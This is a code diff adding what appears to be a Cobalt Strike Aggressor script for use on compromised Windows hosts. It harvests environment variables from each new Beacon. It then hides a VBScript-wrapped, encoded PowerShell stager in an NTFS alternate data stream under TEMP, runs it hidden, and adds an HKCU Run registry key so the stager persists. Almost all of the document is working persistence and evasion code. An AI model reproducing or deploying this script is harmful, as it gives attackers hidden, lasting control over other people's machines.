@@ -1,0 +1,108 @@
+
+global('%bvars');
+
+# request environment variables for every new Beacon that comes in.
+on beacon_initial {
+
+        bshell($1, "set");
+	bsleep($1,0);
+}
+
+# parse environment vars from beacon output
+on beacon_output {
+        # do nothing if we already know the env variables
+        if ($1 in %bvars) {
+                return;
+        }
+        # verify this is output for the set command
+        else if ("*APPDATA=*" iswm $2) {
+                local('$temp $key $value');
+                foreach $temp (split("\r\n", $2)) {
+                        if ($temp ismatch '(.*?)=(.*)') {
+                                ($key, $value) = matched();
+                                %bvars[$1][$key] = $value;
+                        }
+                }
+        }
+}
+
+# the long way
+sub randomString {
+        local('$alpha $res $x $size');
+        $size = $1;
+        $alpha  = "abcdefghijklmnopqrstuvwxyz";
+        $alpha .= lc($alpha);
+        $alpha  = split("", $alpha);
+        for ($x = 0; $x <= ($size); $x++) {
+                $res .= rand($alpha);
+        }
+        return "$res";
+}
+
+
+##################################
+
+
+# example ads creation and usage
+
+alias dropads {
+
+	if (listener_info($2) is $null) {
+        berror($1,"Listener $2 does not exist");
+
+        @l = listeners();
+
+        for($i = 0 ; $i < size(@l); $i++) {
+          blog($1,"Available: " . @l[$i]);
+        }
+        return;
+    	}
+
+	$user = binfo($1,"user");
+	$temphome = %bvars[$1]["TEMP"];
+
+	$windir = %bvars[$1]["windir"];
+
+	$filename = randomString(7);
+	$foldername = randomString(7);
+
+	bcd($1,$temphome);
+	bmkdir($1,$foldername);
+
+	$shellcode  = shellcode($2, false);
+	$readytouse = powershell_encode_stager($shellcode);
+
+	$vbscript = "Set objShell = CreateObject(\"Wscript.Shell\") \n 
+	command = \"powershell.exe -ep bypass -enc " . $readytouse . "\" \n 
+	objShell.Run command, 0: \n ";
+
+	# the magic is here
+	$ads = "\\\\?\\$temphome\\$foldername $+ : $+ $filename";
+	bupload_raw($1,$ads,$vbscript);
+	#bupload_raw($1,$filename,$vbscript);
+
+	bshell($1,"cmd /c $windir\\system32\\cscript.exe //E:vbscript $ads");
+
+
+	# build out the regkey
+        $Hive = "HKCU";
+    	$Path = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
+	$Name = "TEST";
+	$Payload = "cmd /C $windir\\system32\\cscript.exe //E:vbscript $ads";
+
+	# add the key
+    	addRegKey($1,$Hive,$Path,$Name,$Payload);
+}
+
+sub addRegKey {
+	$kHive,$kPath,$kName,$kPayload = @_ ;
+	$powershell = "New-ItemProperty -Force -Path \" $+ $kHive $+ : $+ $kPath $+ \" -Name \" $+ $kName $+ \" -PropertyType String -Value \" $+ $kPayload $+ \"";
+	bpowershell($1, $powershell);
+	blog($1,$powershell);
+}
+
+sub remRegKey {
+    $powershell = "Remove-ItemProperty -Path " . $hive . ":" . $keyPath . " -Name " . $keyName;
+    bpowershell($1, $powershell);
+}
+
